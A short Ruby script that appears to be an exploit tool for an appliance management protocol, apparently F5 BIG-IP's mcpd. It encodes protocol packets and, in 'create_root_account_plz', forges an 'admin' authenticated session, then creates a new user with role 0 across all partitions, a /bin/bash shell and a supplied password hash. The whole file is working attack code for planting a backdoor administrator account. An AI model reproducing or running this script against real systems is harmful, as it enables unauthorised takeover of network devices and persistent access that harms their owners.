# Parse the objects file into a tag->name array
TAGS = File.read('./mcp-objects.txt')
  .split(/\n/)
  .select { |s| !s.start_with?('#') && s.include?(' ') }
  .map do |l|
    tag, name = l.split(/ /)

    [ name, tag.to_i(16) ]
  end.to_h

# This won't be 100% reliable, so probably don't block on it
def build(tag, type, data)
  if TAGS[tag].nil?
    raise "Invalid tag: #{ tag }"
  end
  if TAGS[type].nil?
    raise "Invalid type: #{ type }"
  end

  out = ''
  if type == 'structure'
    out = [data.join.length, data.join].pack('Na*')

    # while (out.length % 4) != 0
    #   out += "\0"
    # end
  elsif type == 'string'
    out = [data.length + 2, data.length, data].pack('Nna*')
  elsif type == 'uquad'
    out = [data].pack('Q>')
  elsif type == 'ulong'
    out = [data].pack('N')
  elsif type == 'uword'
    out = [data].pack('n')
  elsif type == 'long'
    out = [data].pack('N')
  elsif type == 'tag'
    out = [TAGS[data]].pack('n')
  elsif type == 'byte'
    out = [data].pack('C')
  elsif type == 'mac'
    out = [data].pack('a6')
  else
    raise "Unknown type: #{ type }"
  end

  out = [TAGS[tag], TAGS[type], out].pack('nna*')

  return out
end

def build_packet(data)
  return [data.length, 0, 0, 0, data].pack('NNNNa*')
end

def create_root_account_plz(username, password_hash)
  print build_packet(
    build('user_authenticated', 'structure', [
      build('user_authenticated_name', 'string', 'admin')
    ])
  )

  print build_packet(
    build('start_transaction', 'structure', [
      build('start_transaction_load_type', 'ulong', 0)
    ])
  )

  print build_packet(
    build('create', 'structure', [
      build('user_role_partition', 'structure', [
        build('user_role_partition_user', 'string', username),
        build('user_role_partition_role', 'ulong',  0),
        build('user_role_partition_partition', 'string', '[All]'),
      ])
    ])
  )

  print build_packet(
    build('create', 'structure', [
      build('userdb_entry', 'structure', [
        build('userdb_entry_name',         'string', username),
        build('userdb_entry_partition_id', 'string', 'Common'),
        build('userdb_entry_is_system',    'ulong',  0),
        build('userdb_entry_shell',        'string', '/bin/bash'),
        # build('userdb_entry_passwd',       'string', 'test'), # "test"
        # build('userdb_entry_is_crypted',   'ulong',  0),
        build('userdb_entry_is_crypted',   'ulong',  1),
        build('userdb_entry_passwd',       'string', password_hash), # "test"
        # build('userdb_entry_description',  'string', ''),
      ])
    ])
  )

  print build_packet(
    build('end_transaction', 'structure', [])
  )
end
